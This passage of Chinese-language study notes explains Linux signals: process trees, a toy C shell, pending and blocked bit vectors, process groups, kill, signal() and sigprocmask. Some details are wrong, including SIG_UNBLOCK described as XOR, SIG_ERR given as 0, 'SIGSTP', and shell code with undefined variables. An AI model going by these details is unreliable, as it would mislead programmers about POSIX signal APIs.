中的信号（signal）机制。</p><h2 id="13-5-Exception-Control-Flow-Signals"><a href="#13-5-Exception-Control-Flow-Signals" class="headerlink" title="13.5 Exception Control Flow: Signals"></a>13.5 Exception Control Flow: Signals</h2><p>信号是由 OS 进行管理的软件信号，信号的种类和规范都由 OS 制定，完成 OS 和应用程序间的通信，实现高级的 Exception Control Flow；因此，我们需要先了解一下 OS（以 x86-64 Linux 为例）进程的继承结构，这样有助于在分析信号的时候不至于晕头转向。</p><h3 id="13-5-1-Linux-Process-Hierarchy-amp-Shell-Example"><a href="#13-5-1-Linux-Process-Hierarchy-amp-Shell-Example" class="headerlink" title="13.5.1 Linux Process Hierarchy &amp; Shell Example"></a>13.5.1 Linux Process Hierarchy &amp; Shell Example</h3><p>在 Linux 中，只有一种方法创建新的进程 —— <code>fork</code>；而由 <code>fork</code> 创建的进程有明确的父子关系，因此，Linux 中的所有程序所在进程实际上形成了一个层次结构：<strong>进程树</strong>。</p><p>在 Linux 启动的第一个进程是 <code>init</code> 根进程（PID = 1），其后所有生成的进程均为 <code>init</code> 的子进程。<code>init</code> 进程一般会创建 2 类进程：</p><ul><li><p><code>Daemon</code>：守护进程，是一类长期运行的程序，用来提供服务（例如对于一个 web 服务器，那么可能运行的服务是 apache 服务 <code>httpd</code>）；</p></li><li><p><code>login shell</code>：登录进程，这个进程运行的是命令行程序，为用户提供命令行接口，这样用户在登录后，可以以特定用户的身份，通过输入命令的方式与程序进行交互；</p><blockquote><p>例如用户输入 <code>echo &quot;Hello, Linux.&quot;</code> 的指令并回车，发生的是如下情况：</p><p><img src="imgs/login_shell.png" height="200px"></p></blockquote></li></ul><p>知道了这个道理，再结合上一节我们接触到的 process control 的系统级函数，我们就可以开始自己尝试用 C 写一个系统命令行了。我们来看看这个小型的命令行程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXLINE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXARGS 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unix_error</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Fgets</span><span class="params">(<span class="type">char</span>* dst, <span class="type">int</span> cnt, FILE* input)</span>;    <span class="comment">/* 定义略，就是对 fgets 的包装 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* line, <span class="type">char</span>* argv[])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span>* cmd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> cmdline[MAXLINE];    <span class="comment">/* command line */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* read */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        Fgets(cmdline, MAXLINE, <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="keyword">if</span> (feof(<span class="built_in">stdin</span>))</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* evaluate */</span></span><br><span class="line">        eval(cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">eval</span><span class="params">(<span class="type">char</span>* cmd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS];    <span class="comment">/* Argument list execve() */</span></span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];        <span class="comment">/* Holds modifiled command line */</span></span><br><span class="line">    <span class="type">int</span> bg;                    <span class="comment">/* Should the job run in bg or fg ? */</span></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    bg = parseline(buf, argv);</span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;        <span class="comment">/* Ignore empty lines */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!builtin_command(argv)) &#123;    <span class="comment">/* Check if it is a builtin command */</span></span><br><span class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;    <span class="comment">/* Child runs user job */</span></span><br><span class="line">            <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, atgv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* Parent waits for foreground job to terminate */</span></span><br><span class="line">        <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                unix_error(<span class="string">&quot;waitfg: waitpid error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %s&quot;</span>, pid, cmdline);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>细心的同学会发现，这个程序有个严重的 bug —— 它只对运行在 foreground（前台）的程序进行回收，对运行在 background（后台）的程序则仅仅是打印一条信息，就不再关心了。前一节我们讨论过，像 shell 这样长期运行的程序如果不回收其子进程，会导致 zombie 的堆积，引发内存泄漏的问题。</p><p>那么问题来了，对于运行在后台的子进程，我们不想等待，但该如何知道它何时结束，并且回收呢？这个问题的解决方案就是<strong>利用 Exception Control Flow</strong>，因为只有它能够不按照应用程序原先控制流，而是转向 OS Kernel，让 OS Kernel 配合通知我们的 shell 后台子进程的情况。这就是本节的主角，也是这类问题的解决方案 —— 信号（高级的 ECF 机制之一）。</p><h3 id="13-5-2-The-Features-of-Signals"><a href="#13-5-2-The-Features-of-Signals" class="headerlink" title="13.5.2 The Features of Signals"></a>13.5.2 The Features of Signals</h3><ul><li>定义：信号是一种软件产生的，<strong>用来通知进程，系统中某一种事件发生的小型信息</strong>。</li></ul><p>我们发现，信号的定义很像之前的 Hardware ECF（Exception），它们都是某种事件发生时触发的信息通知机制，但是后者是<strong>硬件和操作系统层面</strong>（包括 Asynchronous Exception 的硬件引脚 Interrupt 和 Synchronous Exception 的处理器触发进入 Exception table），前者则完全是<strong>由操作系统软件产生的软件层面的信息</strong>，抽象层级更高。</p><ul><li><p>发送方：通常是 <strong>OS Kernel</strong>，有时是<strong>一个 Process 请求内核（利用 <code>syscall</code> 这个 Exception）来向另一个进程发送</strong>（所以本质上<strong>只有</strong> OS Kernel 有权限发送信号）；</p></li><li><p>接收方：总是一个 Process；</p></li><li><p>发送时机：<strong>总是因为</strong>处理器触发了一个 Hardware ECF，进入某个 Exception Handler 中的行为，可能有以下两个原因：</p><ol><li>System call（<code>trap</code>）：有几种<strong>向另一个进程发送特定信号的系统调用</strong>：<code>kill</code>（不是专门 terminated 进程的系统调用，而是用来发信号的，名字起的不好！），和之前我们接触过的 <code>ptrace</code> 等；</li><li>其他 unintended hardware ECF（例如 Interrupt（典型是 <code>Ctrl+C/D/Z</code> 键盘 I/O）、Fault（常见是 Page Fault、Floating Point Exception）等等）；</li></ol></li><li><p>接收时机：？？？（<strong>我们在下一节介绍</strong>）</p></li><li><p>内容：它真的很小，<strong>仅仅是一个小整型 ID（1 ~ 30）</strong>，来代表信号的种类；</p><p>不过每个整型在 OS 中对应唯一的信号类型和含义。下面是常见的几个信号：</p><table>    <tr style="text-align: center;">        <th>ID</th>        <th>Name</th>        <th>Default Action</th>        <th>Corresponding Event</th>    </tr>    <tr>        <td>2</td>        <td>SIGINT</td>        <td>Terminate</td>        <td>User typed ctrl-c</td>    </tr>    <tr>        <td>9</td>        <td>SIGKILL</td>        <td>Terminate</td>        <td>Kill program (<b>cannot override or ignore</b>)</td>    </tr>    <tr>        <td>11</td>        <td>SIGSEGV</td>        <td>Terminate &amp; Core dump</td>        <td>Segmentation violation</td>    </tr>    <tr>        <td>14</td>        <td>SIGALRM</td>        <td>Terminate</td>        <td>Timer signal</td>    </tr>    <tr>        <td>17</td>        <td>SIGCHLD</td>        <td>Ignore</td>        <td>Child stopped or terminated</td>    </tr></table><p>我们解释一些上面的信号。</p><p>首先，<code>SIGINT</code> 就是我们对前台运行的程序触发 <code>Ctrl+C</code> 按键后，首先发生 Asynchronous Exception（Interrupt），通知处理器，处理器按照 Exception 处理流程转移到 OS Kernel 中处理 Keyboard Interrupt 的 Exception Handler 中，发现这是个 <code>Ctrl+C</code>，因此向目标进程发送一个 <code>SIGINT</code> 信号，然后把 Control Flow 交还 user mode 的 $I_{next}$；同时，目标进程收到信号会进行默认行为 —— terminated（可以 override，即自己设计接收信号的 procedure）；</p><p>对于 <code>SIGKILL</code> 过程类似上面的情况，但是它一般利用 <code>kill -9</code> 指令，进行了系统调用，通过 <code>trap</code> 来发送信号；</p><p>对于 <code>SIGSEGV</code>，一般是处理器访问非法地址后出现 <code>page fault</code>，可能发送这个信号；</p><p>对于 <code>SIGALRM</code>，一般可以用作自定义信号，利用硬件时钟进行一些任务（例如设置与超时相关的行为）；</p><p>对于 <code>SIGCHILD</code>，一般在<strong>一个进程的子进程的状态改变后</strong>，OS Kernel 会向该父进程发送这条信号，但默认行为是忽略。如果父进程是一个 long-run program 并且不使用阻塞的 <code>waitpid</code>，那么我们在父进程中应该主动捕获这个信号，防止发生子进程的内存泄漏；</p><blockquote><p>除此之外，我们在前面还见到过 <code>SIGFPE</code>、<code>SIGGPE</code> 等等信号，用到时再查也不迟；</p></blockquote></li></ul><h3 id="13-5-3-Implementations-of-Sending-a-Signal"><a href="#13-5-3-Implementations-of-Sending-a-Signal" class="headerlink" title="13.5.3 Implementations of Sending a Signal"></a>13.5.3 Implementations of Sending a Signal</h3><p>那么，通过上面的解释，我们大致知道了，OS Kernel 大多是借助 Exception（Hardware ECF）这个时机来实现信号的发送的，但具体是如何进行的呢？</p><p>实际上，OS Kernel 向某个进程发送信号是通过<strong>改变目标进程上下文的状态数据</strong>来实现的。</p><blockquote><p>Linux 官方文档原文：</p><p>Kernel sends a signal to a destination process by updating some state in the context of the destination process.</p></blockquote><p>对，仅仅是目标进程的上下文的某个数据改变了，仅此而已。</p><p>那么，目标进程的响应机制呢？主要有以下几种：</p><ul><li><p><strong>Ignore</strong>：忽略该信号；</p></li><li><p><strong>Terminate</strong>：该进程终止，或被迫终止（不是中止，stopped）；</p></li><li><p><strong>Catch</strong>：捕获信号并处理（这里捕获信号并处理的程序称为 <strong>Signal Handler</strong>，<strong>它与 Exception Handler 不一样，它位于用户态代码中——也就是说，咱可以自己在 C 程序中设计 Signal Handler</strong>）；</p><p>对于 catch 这个选项而言，我们还要了解一下 signals 到达目标进程后的过程：</p><p><img src="imgs/signal_procedure.png" height="200px"></p><p>但是，在<strong>信号到达后、进程 A 收到（就是感知到）并处理之前</strong>的一段时间内，由于<strong>某个给定的时刻，只能有一个类型的待处理信号</strong>（因为信号是一个整型，发送信号就是改变一个数据，没有队列这个数据结构，所以重复发就会覆盖，下面会看到这种数据结构）。所以有两个问题：</p><ol><li>我们不能继续给这个进程发送信号，那么 OS 应该怎么知道目标进程有没有收到？</li><li>进程 A 是按照普通控制流正常运行的，怎么让它去临时接收这个信号呢？</li></ol><p>实际上，这引入了信号的 2 个概念：<strong>Pending 和 Blocked</strong>；不仅如此，我们还要了解 <strong>进程组的概念</strong>，然后我们才能完整地解释信号的收发过程。</p></li></ul><hr><p>下面是 13.5.3 的知识补充：</p><h4 id="13-5-3-1-Signal-Concepts-Pending-amp-Blocked"><a href="#13-5-3-1-Signal-Concepts-Pending-amp-Blocked" class="headerlink" title="13.5.3.1 Signal Concepts: Pending &amp; Blocked"></a>13.5.3.1 Signal Concepts: Pending &amp; Blocked</h4><p>其实信号也存在状态，其中两个特殊的状态是 pending 和 blocked：</p><ul><li>如果一个信号被 OS Kernel 发送，但是还没有被目标进程接收（感知并处理），那么这个信号处于 Pending 状态；（<strong>重复一遍，没有队列数据结构</strong>）</li><li>如果一个信号被 OS Kernel 发送，但是目标进程显式地阻塞特定信号的接收（感知但保留信号不处理），那么这个信号处于 Blocked 状态，除非该进程主动 unblock；</li></ul><p>从这里我们可以知道，<strong>pending 状态的 signals 至多只会被目标进程接收一次，但 blocked 状态的 signals 可以接收多次</strong>；</p><p>我们说过，信号只是一个表示信号类型的小整型，存不了其他数据，因此<strong>信号的状态是由 OS Kernel 维护的</strong>。</p><p>OS Kernel 中<strong>保存了各进程的 Pending / Blocking bits 组成的 bit vectors</strong>，位于每个进程的上下文虚拟内存的 kernel space 中。维护方法如下。</p><p><strong>对于 Pending Signals</strong>；</p><ul><li>当一个另一个进程的 OS Kernel 向当前（目标）进程发送<strong>第 k 号</strong>信号，那么当前进程的 OS Kernel 会设置当前进程的 Signal Pending Vector 的<strong>第 k 位</strong>为有效位（假设是 1）；</li><li>当当前进程接收了这个信号 k，那么当前进程的 OS Kernel 会设置当前进程的 Signal Pending Vector 的第 k 位为无效位（对应是 0）；</li></ul><p><strong>对于 Blocked Signals</strong>：</p><blockquote><p>Signal Blocked Vector 相当于是对 Signal Pending Vector 的<strong>掩码</strong>（被称为 <strong>signal mask，信号掩码</strong>）。</p></blockquote><p>如果 block / unblock 特定信号，那么目标进程会使用 <strong><code>sigprocmask</code>（又一个系统调用）</strong>显式设置掩码位对应的 Pending Signal 是否有效。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Prototype for the glibc wrapper function */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *_Nullable <span class="keyword">restrict</span> <span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                <span class="type">sigset_t</span> *_Nullable <span class="keyword">restrict</span> oldset)</span>;</span><br></pre></td></tr></table></figure><p>具体用法见 13.5.5 节；</p><h4 id="13-5-3-2-Process-Concept-Process-Groups"><a href="#13-5-3-2-Process-Concept-Process-Groups" class="headerlink" title="13.5.3.2 Process Concept: Process Groups"></a>13.5.3.2 Process Concept: Process Groups</h4><p>在 Linux 下，每个进程都明确属于一个进程组。那么如何为一个新产生的进程分配进程组？</p><p>实际上，进程组的分配有专门的系统调用（又来几个系统调用）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">getpgrp</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">/* Equivalent to getpgid(currentPID); */</span></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">getpgid</span><span class="params">(<span class="type">pid_t</span> pid)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">setpgrp</span><span class="params">(<span class="type">void</span>)</span>;    <span class="comment">/* Equivalent to setpgid(currentPID, currentPID); */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>上述函数执行失败返回值均为 -1，均会设置 <code>errno</code>，注意检查。</p></blockquote><p>注意，进程组号 PGID 和进程 PID 是共用类型 <code>pid_t</code> 的。</p><p>此外，创建一个进程，<strong>默认的进程组号与父进程的进程组号相同</strong>。进程属于且仅能属于一个进程组；</p><p>这样的话，可以方便我们向<strong>在同一进程组中的所有进程都发送信号</strong>。例如，如果我们使用系统调用 <code>kill</code> 来给一个进程或进程组发送信号（以包装好的系统命令为例。当然，C library 也包装了一个系统级函数 <code>kill</code>，能够在 C 中向另一个进程发送信号）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 12345</span><br></pre></td></tr></table></figure><p>上面的指令就表示请求 bash 调用系统调用 <code>kill</code>，向<strong>进程号</strong>为 <code>12345</code> 的一个进程发送 9 号信号（<code>SIGKILL</code>）；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 -12344</span><br></pre></td></tr></table></figure><p>上面的指令由于进程号前加了一个短 dash，因此被解释为 <strong>进程组号</strong>，上面的行为是向<strong>进程组号</strong>为 <code>12344</code> 的所有进程发送 9 号信号。</p><p>然后我们回过头解释一下 <code>Ctrl+C/Z</code> 是如何发送信号的。如下图。</p><p><img src="imgs/process_group.png" height="300px"></p><p>首先，我们在 bash 中输入的指令和我们之前了解的一样，分为前台和后台任务；bash shell 在 <code>fork</code> + <code>execve</code> 一个指令的时候，会根据指令后面有没有 <code>&amp;</code> 来判断这是条前台还是后台任务。如果是前台任务，那么创建进程后还会进行系统调用，将前台任务放到<strong>前台进程组</strong>中。前台进程在一个 shell 主进程中只有一个，所以一般这个前台进程组由 shell 进程直接管理。</p><p>如果我们按下 Ctrl+C/Z，那么 Interrupt Exception Handler 的默认行为就是向 shell 进程发送 <code>SIGINT/SIGSTP</code> 信号；而 shell 定义了对于该信号的 Signal Handler，也就是<strong>向前台进程组中所有进程发送 <code>SIGINT/SIGSTP</code></strong>（不影响后台进程）。这就完成了一次键盘 I/O 信号的发送和传递。</p><blockquote><p>注：<code>SIGSTP</code> 信号的默认行为是让目标进程的状态 suspend 到 stopped 状态，直到接收到 <code>SIGCONT</code> 信号后才恢复。</p></blockquote><hr><h4 id="Back-to-13-5-3"><a href="#Back-to-13-5-3" class="headerlink" title="Back to 13.5.3"></a>Back to 13.5.3</h4><p>了解了信号的状态和管理的知识 和 进程组的知识，我们再回到 13.5.3，看看<strong>完整的信号处理过程</strong>应该是什么样子的。</p><p>考虑一个会经常出现的情形：某一个进程 A 正在执行，进程 B 的 OS Kernel 想向进程 A 发送一个第 k 号信号，怎么办？OS 是这么做的：</p><p><code>step 1.</code> 在某次 Process Context Switch 中，OS 的 scheduler 决定切换到 Process B，于是按照 Process Context Switch 的规范进行切换（保存当前进程上下文数据到当前进程的虚拟内存中，读 Process B 的进程上下文数据并加载到处理器中）；<strong>在运行 B 的代码前，OS Kernel 会按照想要发送给 A 的信号（k）来更改  A 的 Kernel space 中的 Pending Vector（将第 k bit 置为有效位 1）</strong> 然后转入用户态，正式运行 Process B 的代码；</p><p><code>step 2.</code> 在执行 Process B 一段时间后，处理器触发了 Exception（Interrupt、Trap、Recoverable Fault），于是控制流重新进入内核态。假如 scheduler 决定切换到另一个进程（也就是目标进程）A，<strong>那么在正式切换前，Kernel 会检查进程 A 的 signal 情况：使用 <code>pnb = pending &amp; ~blocked</code> 计算出上次 Kernel 发给这个进程的信号的集合，<code>pnb</code> 就是所有未被阻塞的信号的 bit vector</strong>；</p><ul><li>如果 <code>pnb == 0</code>，那么说明当前没有收到未阻塞的信号，OS Kernel 会继续进行 Context Switch 操作，切换到 Process A；</li><li>否则，OS Kernel 会选择 <code>pnb</code> 中最低非零位的 bit（假设第 k 位）作为信号接收。那么，OS Kernel 将 pending vector 第 k 位置为无效位（0），<strong>并且执行对应 k 号信号的 Signal Handler</strong>，<strong>此后重新回到 step 2 计算并检查 <code>pnb</code>，直至 <code>pnb == 0</code></strong>；</li></ul><p>这样信号的发送和接收的流程就形成了闭环：</p><ul><li><strong>信号接收时机：在 Process Context Switch 进入目标进程前统一检查并接收</strong>；</li></ul><p>于是我们可以说：</p><p><strong>信号的发送和接收依靠 Process Context Switch 实现，而 Process Context Switch 又是依靠 Hardware ECF（Exception）来实现的，三者抽象层级依次升高，密不可分，分别构成了硬件与操作系统、操作系统与应用程序间的 ECF 交互机制</strong>。</p><h3 id="13-5-4-Signal-Handlers-amp-Default-Action"><a href="#13-5-4-Signal-Handlers-amp-Default-Action" class="headerlink" title="13.5.4 Signal Handlers &amp; Default Action"></a>13.5.4 Signal Handlers &amp; Default Action</h3><p>好了，到目前为止，我们已经大致将信号机制的脉络捋清了。还有一点，我们之前就很想了解的：<strong>怎么自定义 signal handlers 呢？</strong> 这就需要我们更改一个进程收到某个信号的默认行为（Default Action）了。</p><p>提供修改信号 Default Action 的还是一个<strong>系统调用</strong>：<code>signal</code>（名字和 <code>kill</code> 一样有误导性。这里 <code>signal</code> 系统调用不是发送信号，而是设置进程对于信号的 default action）；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">handler_t</span> *<span class="title function_">signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>注 ：<code>handler_t*</code> 类型被 <code>typedef</code> 为一个函数指针类型 <code>void(*)(int)</code>；</p></blockquote><ul><li><p>第一参数 <code>signum</code>：要修改该进程默认行为的信号编号（在 <code>&lt;signal.h&gt;</code> 中有宏定义可供使用）；</p></li><li><p>第二参数 <code>handler</code>：类型为 <code>void(*)(int)</code> 的函数指针，即为 signal handler（其参数也为信号编号）；</p><blockquote><p>如果是要设置 Ignore / Terminate 为默认行为，那么它们（函数指针）在 <code>&lt;signal.h&gt;</code> 还有特定的宏：<code>SIG_IGN</code>、<code>SIG_DFL</code>；</p></blockquote></li><li><p>返回值：如果执行成功，则返回传入的 signal handler 指针；否则返回宏 <code>SIG_ERR</code>（0）；</p></li></ul><p>可是问题又来了。我们知道，signal handler 会在 Process Context Switch 前被调用，调整程序的 control flow。因此，signal handler 用户态代码 和 普通代码一样，都可以作为<strong>并发流（concurrent flow）</strong>。以前我们接触的并发流都是不同进程间的 control flow。不同进程间资源不共享，它们间的切换依靠 Process Context Switch；</p><p>但是！一旦引入了 signal handler，<strong>signal handler 本身是和原进程并发的</strong>，而它又会共享原进程的一切资源，这可能出现问题（<strong>什么问题？在 16.5.6 节讨论</strong>）</p><p>我们结合 signal handler，顺便复习一下 16.5.3 中的内容，从另一个角度来看<strong>完整的信号收发过程和并发</strong>的情况：</p><p><img src="imgs/full_signal_procedure.png" height="300px"></p><ul><li>首先我们知道，如果有一个进程 B 想要想要给 Process A 发送信号，那么在某次从 Process A  Process Context  Switch 到 Process B <strong>前</strong>（置位操作不一定正好发生在 Process Context Switch 时，可以在此之前），Kernel 就为 Process A 的 Pending Vector 置了有效位（如上图最上面的箭头）；</li><li>随后通过 Process Context Switch 后，控制流进入 Process B；</li><li>一段时间后，如果再次出现了一个 Process Context Switch，决定向 Process A 跳转，那么在进入 A 正式执行前，会检查其 <code>pnb</code> 向量是否为 0（如上图下面的箭头），然后按 default action 进入位于 user code 中的 <code>handler</code>（signal handler）中；</li><li>当 <code>handler</code> 执行完成后，控制流再次进入 kernel code 进行一些准备（例如恢复 $I_{next}$ 数据）；</li><li>最后控制流真正回到 user code 的 $I_{next}$ 的位置继续执行；</li></ul><h3 id="13-5-5-Nested-Signal-Handlers"><a href="#13-5-5-Nested-Signal-Handlers" class="headerlink" title="13.5.5 Nested Signal Handlers"></a>13.5.5 Nested Signal Handlers</h3><p>⚠ 这会出现一种情况 “Nested Signal Handlers”，因为在运行在 signal handler 时，毕竟也是 user code，也有可能发生 process context switch：</p><p><img src="imgs/nested_signal_handlers.png" height="250px"></p><p>为啥要讨论这种情况？因为 <strong>OS Kernel 对已经正在处理同类型信号时（即位于该信号的 Signal Handler 时），会自动阻塞该进程对同类型信号的接收</strong>。这种信号阻塞方式称为 <strong>Implicit blocking（隐式阻塞）</strong>；</p><blockquote><p>例如上图，如果程序位于第（4）步，那么它既会阻塞 <code>S</code> 信号，又会阻塞 <code>T</code> 信号的接收。</p></blockquote><p>而我们之前 16.3.5.1 介绍过的 <code>sigprocmask</code> 系统调用，则是程序可以显式地修改对信号的阻塞情况。</p><p>我们再回顾一下它的声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Prototype for the glibc wrapper function */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">const</span> <span class="type">sigset_t</span> *_Nullable <span class="keyword">restrict</span> <span class="built_in">set</span>,</span></span><br><span class="line"><span class="params">                <span class="type">sigset_t</span> *_Nullable <span class="keyword">restrict</span> oldset)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里的 <code>sigset_t</code> 就是之前我们说的 Pending Bit Vector 的数据；</p></blockquote><ul><li>第一参数 <code>how</code> 可不是信号编号，因为信号编号应该是 <code>set</code> 的 bit 位；它是 <strong><code>sigprocmask</code> 要执行的行为</strong>，具体也是由宏定义的：<ul><li><code>SIG_BLOCK</code>：将指定参数 <code>set</code> 的有效位加入现在的 blocking bit vector，阻塞指定信号（<code>blocked |= set</code>）；</li><li><code>SIG_UNBLOCK</code>：将指定参数 <code>set</code> 中的有效位从现在的 blocking bit vector 移除，停止阻塞某种信号（<code>blocked ^= set</code>）；</li><li><code>SIG_SETMASK</code>：直接将参数 <code>set</code> 作为 blocking bit vector（<code>blocked = set</code>）；</li></ul></li><li>第二参数 <code>set</code> 是一个与 pending bit vector 格式相同的数据，作用在第一参数中能看到，具体我们怎么操作这个向量并且填上去，还有专门设置这个 vector 的函数：<ul><li><code>sigemptyset</code>：返回一个空的 pending bit vector 数据；</li><li><code>sigfillset</code>：返回一个每个信号位都有效的 pending bit vector 数据；</li><li><code>sigaddset</code>：返回一个在输出 pending bit vector 基础上置位指定信号位的新的 pending bit vector 数据；</li><li><code>sigdelset</code>：同理，删除；</li></ul></li><li>第三参数在接下来的例子中就能看到。</li></ul><p><strong>这个虽然很多，但很重要！！！在 Shell Lab 中会用到</strong>。</p><p>为什么我们要用到它们呢？直接交给 OS Kernel 隐式阻塞不好吗？<strong>我们不妨考虑一个场景，如果程序中有一串代码不希望被用户用 Ctrl+C 打断，那么我们就需要暂时显式地阻塞 <code>SIGINT</code> 信号</strong>，下面就是例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">sigset_t</span> mask, prev_mask;</span><br><span class="line">sigemptyset(&amp;mask);</span><br><span class="line">sigaddset(&amp;mask, SIGINT);</span><br><span class="line"><span class="comment">/* Block SIGINT and save previous blocked set */</span></span><br><span class="line">sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Code region that will not be interrupted by SIGINT */</span></span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Restore previous blocked set, unblocking SIGINT */</span></span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev_mask, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>看完这串代码你大概能明白 <code>sigprocmask</code> 